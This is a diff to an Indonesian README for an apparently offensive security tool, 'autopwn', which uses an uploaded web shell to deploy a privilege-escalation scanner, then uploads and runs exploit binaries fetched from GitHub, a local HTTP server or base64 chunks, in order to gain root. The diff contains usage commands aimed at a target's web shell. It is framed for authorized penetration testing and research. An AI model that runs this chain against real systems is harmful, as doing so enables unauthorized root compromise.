@@ -148,6 +148,7 @@ Match confidence `possible` (distro-pin/`[all]`) tidak disertakan kecuali `--inc
 ```bash
 python3 lpescan/autopwn.py --shell http://TARGET/uploads/shell.php   # full: scan→root
 python3 lpescan/autopwn.py --shell URL --scan-only                   # scan + PLAN.md saja
+python3 lpescan/autopwn.py --shell URL --github                      # biner dari GitHub (raw)
 python3 lpescan/autopwn.py --selftest                                # gate offline
 ```
 
@@ -155,10 +156,11 @@ Orkestrator sisi penyerang: deploy scanner ke target lewat web shell → ambil
 report → pilih biner PoC dari arsip lokal `cve-lpe/pocs/bin/` → upload →
 eksekusi checker/exploit → verifikasi root. Scanner tetap read-only; yang
 mengeksekusi PoC hanya tool ini, hanya terhadap target dari `--shell`.
-Pengiriman biner tiga lapis: `--fetch-base URL` (hosting eksternal) → HTTP
-server ephemeral di mesin arsip (default; target tarik via `python3 urllib`,
-tanpa hosting publik) → fallback chunk base64 via shell. Terbukti E2E di lab
-(2026-09-28): dua box Ubuntu 24.04 di-root via CVE-2026-31431 CopyFail.
+Pengiriman biner tiga lapis: `--fetch-base URL` (hosting eksternal; `--github`
+= langsung dari repo ini via raw.githubusercontent) → HTTP server ephemeral di
+mesin arsip (default; target tarik via `python3 urllib`, tanpa hosting publik)
+→ fallback chunk base64 via shell. Terbukti E2E di lab (2026-09-28): dua box
+Ubuntu 24.04 di-root via CVE-2026-31431 CopyFail.
 
 **Khusus target terautorisasi.** Produksi: wajib `--production` +
 `--confirm-production` (banner risiko). Detail: `lpescan/README.md`.
@@ -209,11 +211,11 @@ Ringkasan vektor LPE klasik dan di mana lpescan mendeteksinya:
 
 ## Disclaimer
 
-Tool ini dibuat untuk **pendidikan dan riset keamanan terautorisasi** (lab pribadi, CTF,
-pentest dengan izin). Penulis tidak bertanggung jawab atas penggunaan yang melanggar hukum.
-Review setiap PoC sebelum dijalankan — verifikasi offset, arsitektur, dan constraint versi.
+**FOR EDUCATIONAL PURPOSES ONLY.** Tool ini dibuat untuk **pendidikan dan riset
+keamanan terautorisasi** (lab pribadi, CTF, pentest dengan izin). Penulis tidak
+bertanggung jawab atas penggunaan yang melanggar hukum. Review setiap PoC
+sebelum dijalankan — verifikasi offset, arsitektur, dan constraint versi.
 
 ## Lisensi
 
-TBD — tentukan sebelum publikasi (dataset berasal dari NVD/CISA, domain publik;
-kode tool bisa MIT).
+Kode tool: **MIT** (`LICENSE`). Dataset berasal dari NVD/CISA (domain publik).
